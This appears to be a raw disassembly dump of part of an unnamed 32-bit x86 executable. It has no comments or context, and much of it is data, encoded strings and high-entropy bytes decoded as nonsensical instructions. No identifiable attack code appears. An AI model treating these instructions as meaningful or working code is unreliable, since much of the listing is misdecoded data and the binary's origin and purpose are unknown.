  413a57:	dec    edi
  413a58:	cmp    cl,BYTE PTR [edi+0x36]
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	mov    ds:0xb30fa31f,al
  413a62:	or     al,0xb0
  413a64:	jl     0x413a26
  413a66:	jge    0x413a29
  413a68:	aas    
  413a69:	dec    edi
  413a6a:	ins    BYTE PTR es:[edi],dx
  413a6b:	dec    edi
  413a6c:	cmp    cl,BYTE PTR [edi+0x4e]
  413a6f:	dec    edi
  413a70:	cmp    DWORD PTR [edi+0x7c],ecx
  413a73:	dec    edi
  413a74:	cmp    eax,0x334f5f4f
  413a79:	dec    edi
  413a7a:	cmp    cl,BYTE PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	push   ds
  413a7f:	mov    dl,0x1f
  413a81:	mov    bl,0xf
  413a83:	ret    
  413a84:	or     al,0xc0
  413a86:	jl     0x413a58
  413a88:	jge    0x413a5b
  413a8a:	aas    
  413a8b:	dec    edi
  413a8c:	ins    BYTE PTR es:[edi],dx
  413a8d:	dec    edi
  413a8e:	cmp    cl,BYTE PTR [edi+0x4e]
  413a91:	dec    edi
  413a92:	cmp    DWORD PTR [edi+0x6a],ecx
  413a95:	dec    edi
  413a96:	cmp    eax,0x304f4e4f
  413a9b:	dec    edi
  413a9c:	cmp    cl,BYTE PTR [edi+0x34]
  413a9f:	dec    edi
  413aa0:	push   ds
  413aa1:	ret    0xc31f
  413aa4:	psrlq  mm1,QWORD PTR [eax+edx*8]
  413aa8:	jl     0x413a8a
  413aaa:	jge    0x413a8d
  413aac:	aas    
  413aad:	dec    edi
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	dec    edi
  413ab0:	cmp    cl,BYTE PTR [edi+0x4e]
  413ab3:	dec    edi
  413ab4:	cmp    DWORD PTR [edi+0x6b],ecx
  413ab7:	dec    edi
  413ab8:	cmp    eax,0x304f484f
  413abd:	dec    edi
  413abe:	cmp    cl,BYTE PTR [edi+0x36]
  413ac1:	dec    edi
  413ac2:	push   ds
  413ac3:	rcr    BYTE PTR [edi],cl
  413ac5:	ror    DWORD PTR [edi],cl
  413ac7:	jecxz  0x413ad5
  413ac9:	loopne 0x413b47
  413acb:	lock jge 0x413abf
  413ace:	aas    
  413acf:	dec    edi
  413ad0:	imul   ecx,DWORD PTR [edi+0x3a],0x394f5f4f
  413ad7:	dec    edi
  413ad8:	dec    edx
  413ad9:	dec    edi
  413ada:	ds dec edi
  413adc:	cmp    cl,BYTE PTR [edi+0x3f]
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	loop   0x413b02
  413ae3:	jecxz  0x413af4
  413ae5:	repz or al,0xf0
  413ae8:	jl     0x413aea
  413aea:	jge    0x413aed
  413aec:	jl     0x413afe
  413aee:	jge    0x413b01
  413af0:	ds dec edi
  413af2:	jg     0x413b43
  413af4:	cmp    cl,BYTE PTR [edi+0x53]
  413af7:	dec    edi
  413af8:	cmp    BYTE PTR [edi+0x6a],cl
  413afb:	dec    edi
  413afc:	ds dec edi
  413afe:	dec    ecx
  413aff:	dec    edi
  413b00:	xor    ecx,DWORD PTR [edi+0x3a]
  413b03:	dec    edi
  413b04:	xor    DWORD PTR [edi+0x1e],ecx
  413b07:	add    bl,BYTE PTR [edi]
  413b09:	add    ecx,DWORD PTR [edi]
  413b0b:	adc    ecx,DWORD PTR [eax+edx*1]
  413b0e:	jl     0x413b30
  413b10:	jge    0x413b33
  413b12:	aas    
  413b13:	dec    edi
  413b14:	add    BYTE PTR [eax],al
  413b16:	sahf   
  413b17:	cmp    DWORD PTR [ecx+0x0],eax
  413b1a:	xchg   edx,eax
  413b1b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b1e:	call   0x413d:0xea00413b
  413b25:	add    BYTE PTR [esi+0x3d],cl
  413b28:	inc    ecx
  413b29:	add    dl,bl
  413b2b:	cmp    eax,0x3b7a0041
  413b30:	inc    ecx
  413b31:	add    BYTE PTR [esi+0x3b],bh
  413b34:	inc    ecx
  413b35:	add    dl,dl
  413b37:	cmp    eax,0x3be20041
  413b3c:	inc    ecx
  413b3d:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  413b44:	pushf  
  413b45:	clc    
  413b46:	xchg   esi,eax
  413b47:	cmp    eax,DWORD PTR [ecx+0x0]
  413b4a:	or     bh,BYTE PTR ds:0x3d1e0041
  413b50:	inc    ecx
  413b51:	add    BYTE PTR [edx],ch
  413b53:	cmp    eax,0x3d3a0041
  413b58:	inc    ecx
  413b59:	add    dh,cl
  413b5b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b5e:	call   0x413b:0xee004139
  413b65:	add    dh,bl
  413b67:	cmp    eax,DWORD PTR [ecx+0x0]
  413b6a:	out    dx,al
  413b6b:	cmp    eax,0x85350041
  413b70:	pushf  
  413b71:	clc    
  413b72:	cwde   
  413b73:	or     edx,DWORD PTR [edi]
  413b75:	and    DWORD PTR [edx-0x64ffbec5],0x8f81161c
  413b7f:	or     eax,0x705
  413b84:	inc    eax
  413b85:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413b89:	fnstsw WORD PTR [ebx]
  413b8b:	xor    eax,0x68720043
  413b90:	inc    ebp
  413b91:	inc    ecx
  413b92:	(bad)  
  413b93:	cli    
  413b94:	jne    0x413bf8
  413b96:	(bad)  
  413b97:	in     eax,dx
  413b98:	inc    BYTE PTR [edi]
  413b9a:	mov    esi,0x8a05a3fa
  413b9f:	cmp    eax,DWORD PTR [ecx+0x0]
  413ba2:	xor    al,0x95
  413ba4:	pushf  
  413ba5:	clc    
  413ba6:	xor    al,0x96
  413ba8:	pushf  
  413ba9:	clc    
  413baa:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  413bb0:	pushf  
  413bb1:	clc    
  413bb2:	cmp    DWORD PTR [ebp-0x6ac70764],edx
  413bb8:	pushf  
  413bb9:	clc    
  413bba:	aas    
  413bbb:	xchg   ebp,eax
  413bbc:	pushf  
  413bbd:	clc    
  413bbe:	ds xchg ebp,eax
  413bc0:	pushf  
  413bc1:	clc    
  413bc2:	cmp    eax,0x3cf89c95
  413bc7:	xchg   ebp,eax
  413bc8:	pushf  
  413bc9:	clc    
  413bca:	and    eax,0xe9f89c95
  413bcf:	stc    
  413bd0:	add    esp,DWORD PTR [eax-0x6e]
  413bd3:	cmp    DWORD PTR [ecx+0x0],eax
  413bd6:	push   ss
  413bd7:	add    BYTE PTR [ebx+0x0],al
  413bda:	pop    ecx
  413bdb:	dec    ecx
  413bdc:	imul   si,WORD PTR ds:0x98f89c85,0xffe9
  413be4:	push   eax
  413be5:	pop    es
  413be6:	arpl   WORD PTR [edx],cx
  413be8:	add    BYTE PTR [eax],al
  413bea:	mov    ?,WORD PTR [ecx]
  413bec:	inc    ecx
  413bed:	add    BYTE PTR [edx+0xe040b],bl
	...
  413c23:	adc    BYTE PTR [eax+0x0],al
  413c26:	cmp    dl,BYTE PTR [eax]
  413c28:	inc    ebx
  413c29:	add    BYTE PTR [eax],al
  413c2b:	add    BYTE PTR [eax],al
  413c2d:	add    BYTE PTR [eax+eax*1+0x46],al
  413c31:	add    BYTE PTR [ecx+0x0],ch
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	add    BYTE PTR [edx+0x0],cl
  413c38:	dec    ecx
  413c39:	add    BYTE PTR [eax+eax*1+0x46],al
  413c3d:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c41:	add    BYTE PTR [ebp+0x0],dl
  413c44:	inc    esi
  413c45:	add    BYTE PTR [edi+0x0],cl
  413c48:	imul   eax,DWORD PTR [eax],0x6f
  413c4b:	add    BYTE PTR [edx+0x0],ch
  413c4e:	dec    ebx
  413c4f:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c53:	add    BYTE PTR [edx+0x0],ch
  413c56:	imul   eax,DWORD PTR [eax],0x46006f
  413c5c:	jo     0x413c5e
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	add    BYTE PTR [ebx+0x0],ch
  413c62:	ins    DWORD PTR es:[edi],dx
  413c63:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c67:	add    BYTE PTR [ebx+0x0],dh
  413c6a:	ins    BYTE PTR es:[edi],dx
  413c6b:	add    BYTE PTR [edx+0x0],ch
  413c6e:	data16 add BYTE PTR [edi+0x0],ah
  413c72:	imul   eax,DWORD PTR [eax],0x64006f
  413c78:	add    BYTE PTR [di+0x0],dh
  413c7c:	imul   eax,DWORD PTR [eax],0x69006a
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	add    BYTE PTR [esi+0x0],ah
  413c86:	add    BYTE PTR fs:[ebp+0x0],dh
  413c8a:	push   0x0
  413c8c:	add    BYTE PTR [bp+0x0],ah
  413c90:	add    BYTE PTR fs:[eax],al
  413c93:	add    BYTE PTR [eax],al
  413c95:	add    BYTE PTR [ebx+ebp*2+0x6c],al
  413c99:	fs data16 jae 0x413cfe
  413c9d:	push   0x6f
  413c9f:	imul   esp,DWORD PTR [esi+0x64],0x73
  413ca3:	imul   esp,DWORD PTR [esi+0x67],0x6a
  413ca7:	fs addr16 fs pushw 0x6867
  413cae:	addr16 pushw 0x6667
  413cb3:	push   0x6667
  413cb8:	add    BYTE PTR [eax],al
  413cba:	add    BYTE PTR [eax],al
  413cbc:	add    BYTE PTR [eax],al
  413cbe:	dec    ebx
  413cbf:	dec    edx
  413cc0:	dec    edx
  413cc1:	dec    ebx
  413cc2:	inc    esp
  413cc3:	inc    esi
  413cc4:	push   0x6b
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	dec    esp
  413cc8:	cmp    al,BYTE PTR [esi+eax*2+0x49]
  413ccc:	imul   ebp,DWORD PTR [edi+0x64],0x6b66696a
  413cd3:	fs jae 0x413d45
  413cd6:	imul   esp,DWORD PTR [edi+0x66],0x6f696469
  413cdd:	push   0x69
  413cdf:	outs   dx,DWORD PTR ds:[esi]
  413ce0:	dec    edx
  413ce1:	dec    edi
  413ce2:	inc    esp
  413ce3:	inc    esi
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	imul   ebp,DWORD PTR [edx+0x66],0x6f
  413ce9:	imul   esp,DWORD PTR [ebx+esi*2+0x67],0x73666a6f
  413cf1:	imul   ebp,DWORD PTR fs:[si+0x66],0x64
  413cf7:	push   0x643b6c67
  413cfc:	push   0x6667
  413d01:	add    BYTE PTR [eax],al
  413d03:	add    BYTE PTR [eax],al
  413d05:	add    BYTE PTR [ebp+0x51004100],dh
  413d0b:	dec    edi
  413d0c:	pop    edi
  413d0d:	dec    edi
  413d0e:	dec    eax
  413d0f:	dec    edi
  413d10:	push   esp
  413d11:	dec    edi
  413d12:	pop    edi
  413d13:	dec    edi
  413d14:	push   esi
  413d15:	dec    edi
  413d16:	or     DWORD PTR [edi+0x8],ecx
  413d19:	dec    edi
  413d1a:	cmp    cl,BYTE PTR [edi+0x0]
  413d1d:	add    BYTE PTR [ebp+0x4f],bl
  413d20:	pop    esi
  413d21:	dec    edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	or     DWORD PTR [edi+0x8],ecx
  413d27:	dec    edi
  413d28:	cmp    cl,BYTE PTR [edi+0x4f]
  413d2b:	dec    edi
  413d2c:	dec    ecx
  413d2d:	dec    edi
  413d2e:	pop    edi
  413d2f:	dec    edi
  413d30:	dec    eax
  413d31:	dec    edi
  413d32:	or     DWORD PTR [edi+0x8],ecx
  413d35:	dec    edi
  413d36:	cmp    cl,BYTE PTR [edi+0x0]
  413d39:	add    BYTE PTR [ecx+0x4f],cl
  413d3c:	push   edx
  413d3d:	dec    edi
  413d3e:	push   esi
  413d3f:	dec    edi
  413d40:	dec    ebp
  413d41:	dec    edi
  413d42:	pop    ebx
  413d43:	dec    edi
  413d44:	dec    edx
  413d45:	dec    edi
  413d46:	push   ebx
  413d47:	dec    edi
  413d48:	cmp    cl,BYTE PTR [edi+0x0]
  413d4b:	add    BYTE PTR [eax],al
  413d4d:	add    BYTE PTR [esi+0x7d],ch
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	lea    ebp,[esi-0x63]
  413d54:	outs   dx,BYTE PTR ds:[esi]
  413d55:	lods   eax,DWORD PTR ds:[esi]
  413d56:	outs   dx,BYTE PTR ds:[esi]
  413d57:	mov    ebp,0xdd6ecd6e
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	in     eax,dx
  413d5e:	outs   dx,BYTE PTR ds:[esi]
  413d5f:	std    
  413d60:	outs   dx,BYTE PTR ds:[esi]
  413d61:	or     eax,0x2d6e1d6e
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	cmp    eax,0x6d6e5d6e
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jb     0x413ddd
  413d6f:	jae    0x413ddf
  413d71:	jo     0x413de1
  413d73:	jno    0x413de3
  413d75:	jbe    0x413de5
  413d77:	ja     0x413de7
  413d79:	je     0x413de9
  413d7b:	jne    0x413deb
  413d7d:	mov    ch,BYTE PTR [esi-0x75]
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	mov    BYTE PTR [esi-0x77],ch
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    gs,WORD PTR [esi+0x7c]
  413d88:	pop    esi
  413d89:	jge    0x413dd9
  413d8b:	jge    0x413d4b
  413d8d:	jge    0x413deb
  413d8f:	(bad)  
  413d90:	jge    0x413e02
  413d92:	mov    ebp,0x79736eb1
  413d97:	bound  esp,QWORD PTR [edx+0x78265fc6]
  413d9d:	add    BYTE PTR [ebp+0x17],cl
  413da0:	mov    bl,0x56
  413da2:	mov    ebp,0x423742f4
  413da7:	jle    0x413d46
  413da9:	jno    0x413e0f
  413dab:	mov    cl,0x0
  413dad:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d0],0x40
  413db5:	xlat   BYTE PTR ds:[ebx]
  413db6:	aad    0x93
  413db8:	dec    esp
  413db9:	adc    esp,edx
  413dbb:	jge    0x413d88
  413dbd:	faddp  st(7),st
  413dbf:	leave  
  413dc0:	xchg   BYTE PTR [esi+0x1fa23214],ah
  413dc6:	pusha  
  413dc7:	icebp  
  413dc8:	push   esp
  413dc9:	(bad)  
  413dca:	aad    0x18
  413dcc:	aad    0x71
  413dce:	add    BYTE PTR [eax],al
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	out    dx,eax
  413dd3:	(bad)  [ebx+0x7]
  413dd6:	jmp    0xc02f:0x4500413b
  413ddd:	and    bh,BYTE PTR [ecx+eiz*1+0x41]
  413de1:	add    BYTE PTR [esi+0x53],al
  413de4:	outs   dx,DWORD PTR ds:[esi]
  413de5:	push   ebx
  413de6:	cmp    BYTE PTR [ebx],0x41
  413de9:	add    dh,ah
  413deb:	cmp    eax,DWORD PTR [ecx+0x0]
  413dee:	(bad)  
  413def:	in     eax,dx
  413df0:	adc    al,BYTE PTR [edi]
	...
  413e12:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e19:	pop    ecx
  413e1a:	outs   dx,BYTE PTR ds:[esi]
  413e1b:	jbe    0x413e95
  413e1d:	jns    0x413e73
  413e1f:	push   ecx
  413e20:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  413e24:	je     0x413e87
  413e26:	inc    ebx
  413e27:	jo     0x413e9b
  413e29:	data16 jp 0x413e7e
  413e2c:	jp     0x413e86
  413e2e:	ins    BYTE PTR es:[edi],dx
  413e2f:	je     0x413ea0
  413e31:	jns    0x413ea1
  413e33:	popa   
  413e34:	push   esi
  413e35:	push   ebp
  413e36:	push   0x564476
	...
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	add    BYTE PTR [eax+ecx*2+0x74],dl
  413e51:	dec    esp
  413e52:	push   ebx
  413e53:	jne    0x413ec0
  413e55:	popa   
  413e56:	jp     0x413eac
  413e58:	arpl   WORD PTR [ecx+0x4b],cx
  413e5b:	push   edx
  413e5c:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  413e63:	push   0x66495949
  413e68:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413e6c:	push   esi
  413e6d:	jb     0x413ed7
  413e6f:	add    BYTE PTR [ebx+0x51],al
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	pop    eax
  413e74:	ja     0x413ec3
  413e76:	je     0x413eee
  413e78:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  413e7c:	jb     0x413ef7
  413e7e:	inc    edi
  413e7f:	push   edi
  413e80:	push   esi
  413e81:	inc    edi
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	inc    ecx
  413e84:	inc    edi
  413e85:	jae    0x413e87
  413e87:	add    BYTE PTR [edi+0x4a],dl
  413e8a:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413e91:	popa   
  413e92:	push   edi
  413e93:	push   esi
  413e94:	add    BYTE PTR [eax],al
  413e96:	in     al,0xf5
  413e98:	jnp    0x413ee8
  413e9a:	jnp    0x413e6a
  413e9c:	cmc    
  413e9d:	(bad)  
  413e9e:	fcomp  DWORD PTR [esi-0x3394abec]
  413ea4:	lods   al,BYTE PTR ds:[esi]
  413ea5:	imul   ebp,ebp,0xffffffce
  413ea8:	add    BYTE PTR [eax],al
  413eaa:	pop    es
  413eab:	add    DWORD PTR [eax],eax
  413ead:	add    BYTE PTR [ebp-0x6636f86b],dh
  413eb3:	ror    ah,cl
  413eb5:	sahf   
  413eb6:	jae    0x413e5c
  413eb8:	xchg   edi,eax
  413eb9:	pop    ebp
  413eba:	es cld 
  413ebc:	popa   
  413ebd:	mov    ebp,0x5a1fb15b
  413ec2:	jbe    0x413f0e
  413ec4:	fsubr  st,st(4)
  413ec6:	aad    0x11
  413ec8:	push   ebx
  413ec9:	ins    BYTE PTR es:[edi],dx
  413eca:	push   ds
  413ecb:	sbb    al,0x5a
  413ecd:	div    BYTE PTR [esi+esi*1-0x10dbf3c1]
  413ed4:	ds inc ebp
  413ed6:	loop   0x413e7a
  413ed8:	add    al,dh
  413eda:	xchg   esp,eax
  413edb:	mov    WORD PTR ds:0x83a053b4,?
  413ee1:	or     esi,DWORD PTR [eax+0x26afcea7]
  413ee7:	setb   BYTE PTR [edx+0x2e]
  413eeb:	ficom  DWORD PTR [edi+ebx*2-0x68]
  413eef:	sahf   
  413ef0:	rol    dh,1
  413ef2:	icebp  
  413ef3:	cmp    eax,0xafd44d6
  413ef8:	push   ds
  413ef9:	out    dx,eax
  413efa:	mov    bh,0xac
  413efc:	xchg   ebx,eax
  413efd:	cs stc 
  413eff:	iret   
  413f00:	cli    
  413f01:	in     eax,dx
  413f02:	mul    eax
  413f04:	xor    al,0x49
  413f06:	inc    ebp
  413f07:	xor    BYTE PTR [ecx],cl
  413f09:	pusha  
  413f0a:	mov    edx,0xb6898f0a
  413f0f:	pop    edx
  413f10:	out    0x15,eax
  413f12:	or     edx,DWORD PTR [ecx+edi*2]
  413f15:	add    BYTE PTR [edi-0x20],0xaa
  413f19:	lahf   
  413f1a:	xchg   ecx,eax
  413f1b:	test   al,0x4a
  413f1d:	jmp    0xb0e96f8c
  413f22:	mov    edx,0x3ed93399
  413f27:	rol    BYTE PTR [ebp-0xdfbcc78],1
  413f2d:	gs jp  0x413f7d
  413f30:	out    0x8e,eax
  413f32:	pop    edx
  413f33:	lods   al,BYTE PTR ds:[esi]
  413f34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f35:	repnz pop ebp
  413f37:	iret   
  413f38:	xchg   DWORD PTR [ecx+0x1b],ebx
  413f3b:	adc    al,BYTE PTR [ecx]
  413f3d:	pop    eax
  413f3e:	push   eax
  413f3f:	retf   0xc4d3
  413f42:	or     DWORD PTR [eax],ecx
  413f44:	xor    cl,BYTE PTR gs:[ebp-0x509b67cd]
  413f4b:	test   dh,bl
  413f4d:	scas   al,BYTE PTR es:[edi]
  413f4e:	xchg   edx,eax
  413f4f:	mov    eax,ds:0x9346eeed
  413f54:	and    eax,0xaf58d866
  413f59:	pop    ebx
  413f5a:	push   es
  413f5b:	cdq    
  413f5c:	adc    dh,al
  413f5e:	pop    es
  413f5f:	mov    ah,0x39
  413f61:	fwait
  413f62:	popf   
  413f63:	xor    al,0x4a
  413f65:	cmp    eax,0x4e7640d2
  413f6a:	fidivr DWORD PTR [ebp-0x4f]
  413f6d:	test   ebx,ebp
  413f6f:	xor    ah,0x10
  413f72:	mov    al,0x9a
  413f74:	clc    
  413f75:	hlt    
  413f76:	fsubrp st(2),st
  413f78:	cmp    DWORD PTR [ebx],ecx
  413f7a:	sub    BYTE PTR [edx],0x25
  413f7d:	or     eax,0x9510b262
  413f82:	aam    0x11
  413f84:	ins    DWORD PTR es:[edi],dx
  413f85:	dec    esi
  413f86:	jno    0x413ffd
  413f88:	adc    BYTE PTR [edi],bh
  413f8a:	mov    dh,0x4a
  413f8c:	mov    edi,0x96dd2efc
  413f91:	add    BYTE PTR [esi+0x49b034ee],bh
  413f97:	push   ebp
  413f98:	and    DWORD PTR [ecx+0x3f42529d],ebx
  413f9e:	lods   al,BYTE PTR ds:[esi]
  413f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fa0:	aas    
  413fa1:	push   es
  413fa2:	ja     0x413fe7
  413fa4:	mov    ebx,0x6f096b63
  413fa9:	add    al,0x9d
  413fab:	in     eax,dx
  413fac:	xchg   ebx,eax
  413fad:	xchg   esi,eax
  413fae:	push   cs
  413faf:	hlt    
  413fb0:	lea    ebp,[ebp-0x73]
  413fb3:	pop    esp
  413fb4:	sbb    al,0x0
	...
  414016:	pop    edx
  414017:	ficom  DWORD PTR [esi+0x60]
  41401a:	(bad)  
  41401b:	in     al,dx
  41401c:	jle    0x414018
  41401e:	mov    ch,0x80
  414020:	cmp    eax,0x56a476f9
  414025:	fcomip st,st(4)
  414027:	iret   
  414028:	add    BYTE PTR [eax],al
  41402a:	pop    es
  41402b:	add    DWORD PTR [eax],eax
  41402d:	add    BYTE PTR [edx-0x54fc061f],bh
  414033:	xchg   DWORD PTR [esi+0x6e],ebp
  414036:	mov    edx,ebx
  414038:	ds inc ebp
  41403a:	imul   ebp,DWORD PTR [esi+edi*1-0x18],0xfa889373
  414042:	jle    0x414020
  414044:	loope  0x414036
  414046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414047:	cmp    DWORD PTR [ebx+0x158565c2],esi
  41404d:	xlat   BYTE PTR ds:[ebx]
  41404e:	sub    DWORD PTR [esi],0xffffffdc
  414051:	test   eax,0x8c341f69
  414056:	jae    0x414004
  414058:	and    DWORD PTR [esp+ecx*1+0x28],edx
  41405c:	adc    eax,ebx
  41405e:	(bad)  
  41405f:	fxch   st(2)
  414061:	push   0xcabe9576
  414066:	jmp    0x414046
  414068:	jp     0x4140c6
  41406a:	into   
  41406b:	fistp  DWORD PTR [esi+0x6c]
  41406e:	imul   ecx,ebx,0xffffffb2
  414071:	pop    eax
  414072:	fadd   DWORD PTR [edi-0x1c]
  414075:	pop    eax
  414076:	loop   0x414080
  414078:	inc    ebp
  414079:	push   0xf8041fa8
  41407e:	inc    esp
  41407f:	sar    BYTE PTR ds:0x6267e39e,cl
  414085:	sub    DWORD PTR [ecx-0xf2a2929],ebx
  41408b:	leave  
  41408c:	iret   
  41408d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41408e:	cmp    al,0x15
  414090:	sub    bl,cl
  414092:	jg     0x414041
  414094:	xchg   ebx,eax
  414095:	inc    ebp
  414096:	inc    edx
  414097:	test   eax,0x3d4e069f
  41409c:	or     bl,BYTE PTR [edi+eiz*1-0x4d4ebbd8]
  4140a3:	fistp  WORD PTR [eax+0x6b97ce12]
  4140a9:	pop    ebp
  4140aa:	out    0x5f,al
  4140ac:	mov    ds:0xe6aff1b,eax
  4140b1:	adc    dl,al
  4140b3:	icebp  
  4140b4:	ja     0x414069
  4140b6:	repnz mov BYTE PTR [ecx+0x71160ff9],dl
  4140bd:	in     eax,0x4c
  4140bf:	sub    edi,DWORD PTR [esi-0x7d]
  4140c2:	inc    esp
  4140c3:	lea    ecx,[edx+edi*2]
  4140c6:	daa    
  4140c7:	sbb    al,0x90
  4140c9:	add    eax,0x7baa7293
  4140ce:	sbb    eax,0x9fcd089e
  4140d3:	sub    dh,BYTE PTR [ebx]
  4140d5:	mov    edx,0x26f6f5f
  4140da:	cli    
  4140db:	jae    0x414159
  4140dd:	mov    al,0xbc
  4140df:	(bad)  
  4140e0:	jnp    0x4140f3
  4140e2:	mov    ah,0x22
  4140e4:	out    dx,eax
  4140e5:	cwde   
  4140e6:	std    
  4140e7:	lds    esi,FWORD PTR [esi+eiz*8+0x8]
  4140eb:	xlat   BYTE PTR ds:[ebx]
  4140ec:	call   0x1325:0xb9bb3fdf
  4140f3:	mov    esp,0x54d2ca32
  4140f8:	push   ebp
  4140f9:	mov    ebx,0x4e1c8294
  4140fe:	leave  
  4140ff:	fwait
  414100:	out    dx,eax
  414101:	(bad)  
  414103:	loop   0x414180
  414105:	test   al,0x11
  414107:	mov    ecx,0x8ac99b92
  41410c:	mov    dh,0x43
  41410e:	xor    BYTE PTR [ebx+0x3359d727],ah
  414114:	dec    edx
  414115:	loop   0x41409e
  414117:	lock mov ebp,0xa0b8f9a9
  41411d:	or     BYTE PTR [ebx+edi*1-0x65],dl
  414121:	hlt    
  414122:	(bad)  
  414124:	and    BYTE PTR [esi-0x26e48cb0],bl
  41412a:	cmp    edi,DWORD PTR [edx-0x198e339f]
  414130:	mov    ss,edi
  414132:	mov    cl,0xe1
  414134:	jbe    0x414136
	...
  414196:	add    dl,BYTE PTR [edx]
  414198:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41419e:	push   0xffffffdd
  4141a0:	add    eax,0x4f563eb4
  4141a5:	jmp    0x107:0xd0fb
  4141ac:	add    BYTE PTR [eax],al
  4141ae:	pop    ss
  4141af:	adc    DWORD PTR [ebx+0x27],ecx
  4141b2:	pop    edx
  4141b3:	fldcw  WORD PTR ds:0xe16020d1
  4141b9:	stc    
  4141ba:	iret   
  4141bb:	out    dx,eax
  4141bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141bd:	xor    cl,BYTE PTR [ebx]
  4141bf:	xor    al,0x2b
  4141c1:	jmp    0xb625:0xf6690e7c
  4141c8:	aam    0x20
  4141ca:	nop
  4141cb:	mov    al,0x57
  4141cd:	ror    DWORD PTR [eax-0xe18d7e2],1
  4141d3:	cmp    al,0x11
  4141d5:	sub    ch,0x31
  4141d8:	ins    DWORD PTR es:[edi],dx
  4141d9:	inc    edx
  4141da:	cli    
  4141db:	mov    esi,0xb56a5233
  4141e0:	cdq    
  4141e1:	in     eax,dx
  4141e2:	sbb    al,0x5e
  4141e4:	data16 sub al,0x27
  4141e7:	addr16 (bad) 
  4141ea:	and    BYTE PTR [eax-0x4dc0ecf7],bl
  4141f0:	mov    ecx,ebp
  4141f2:	icebp  
  4141f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141f4:	push   eax
  4141f5:	arpl   WORD PTR [bx-0x3284],si
  4141fa:	jns    0x41424b
  4141fc:	scas   eax,DWORD PTR es:[edi]
  4141fd:	xlat   BYTE PTR ss:[ebx]
  4141ff:	xor    al,0x48
  414201:	cmc    
  414202:	or     eax,0x8059e047
  414207:	mov    cl,bl
  414209:	and    al,0xeb
  41420b:	mov    cl,0xe7
  41420d:	fmul   st(5),st
  41420f:	stc    
  414210:	push   eax
  414211:	dec    ebx
  414212:	dec    ebx
  414213:	gs (bad) 
  414215:	jl     0x414218
  414217:	fnsave [edi-0x1a102f90]
  41421d:	mov    ch,0x6e
  41421f:	mov    bh,0xf4
  414221:	and    al,0x66
  414223:	stc    
  414224:	mov    bl,0x9c
  414226:	dec    esp
  414227:	pop    edx
  414228:	add    DWORD PTR [esi+0x1f],ebx
  41422b:	(bad)  
  41422c:	sti    
  41422d:	dec    edi
  41422e:	jmp    0x414241
  414230:	cwde   
  414231:	int3   
  414232:	sbb    eax,0xae4b36fd
  414237:	push   es
  414238:	pusha  
  414239:	cmp    ebx,DWORD PTR [edi-0xeff0472]
  41423f:	lods   eax,DWORD PTR ds:[esi]
  414240:	cmp    al,BYTE PTR [edi]
  414242:	dec    edx
  414243:	xchg   ebp,eax
  414244:	mov    eax,0x66365218
  414249:	push   0xdccccefe
  41424e:	sti    
  41424f:	adc    al,bl
  414251:	inc    ebx
  414252:	push   edx
  414253:	ret    
  414254:	mov    ebx,0x6d97d23e
  414259:	xlat   BYTE PTR ds:[ebx]
  41425a:	popf   
  41425b:	xor    ebp,DWORD PTR [ecx-0x7931f0e0]
  414261:	loopne 0x4141e4
  414263:	sub    BYTE PTR [eax+0x48],ah
  414266:	jecxz  0x414219
  414268:	dec    ebp
  414269:	mov    ebp,0x4d4a67a4
  41426e:	loope  0x4142bc
  414270:	sahf   
  414271:	fisubr WORD PTR [esi+0x3a694ed2]
  414277:	les    edx,FWORD PTR [ebp+edx*4+0x16]
  41427b:	sahf   
  41427c:	jns    0x4142a1
  41427e:	bound  ebx,QWORD PTR [esi-0x5f]
  414281:	mov    ds:0xb4b5ed3,al
  414286:	pop    ss
  414287:	adc    esp,esp
  414289:	xchg   ebx,eax
  41428a:	(bad)  
  41428c:	jae    0x41430c
  41428e:	sub    esp,DWORD PTR [eax+0x5e]
  414291:	cmp    DWORD PTR [ebp+0x14a9a715],ebx
  414297:	adc    BYTE PTR [ebx-0x7810a699],bl
  41429d:	popa   
  41429e:	xchg   esp,eax
  41429f:	inc    ecx
  4142a0:	adc    al,0xf3
  4142a2:	jl     0x41422d
  4142a4:	jp     0x414312
  4142a6:	mov    ah,0x29
  4142a8:	dec    ebp
  4142a9:	test   dh,dh
